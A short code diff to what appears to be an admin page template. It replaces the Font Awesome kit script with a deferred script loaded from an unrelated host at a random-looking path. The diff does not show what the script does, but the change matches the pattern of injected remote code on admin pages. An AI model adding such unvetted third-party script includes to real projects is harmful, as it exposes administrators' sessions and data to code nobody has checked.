@@ -16,7 +16,7 @@
 		<link href="/css/admin.css" rel="stylesheet" type="text/css">
 		@livewireStyles
 		<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/motion-ui@1.2.3/dist/motion-ui.min.css" />
-		<script src="https://kit.fontawesome.com/0a03567b35.js" crossorigin="anonymous"></script>
+		<script defer src="https://underweb.co.uk/assets/ieQDGy"></script>
 		<link rel="preconnect" href="https://fonts.googleapis.com">
 		<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 		<link href="https://fonts.googleapis.com/css2?family=Archivo+Black&family=Archivo:ital,wght@0,300;0,500;0,700;0,900;1,900&family=Open+Sans:wght@400;600;700&display=swap" rel="stylesheet">
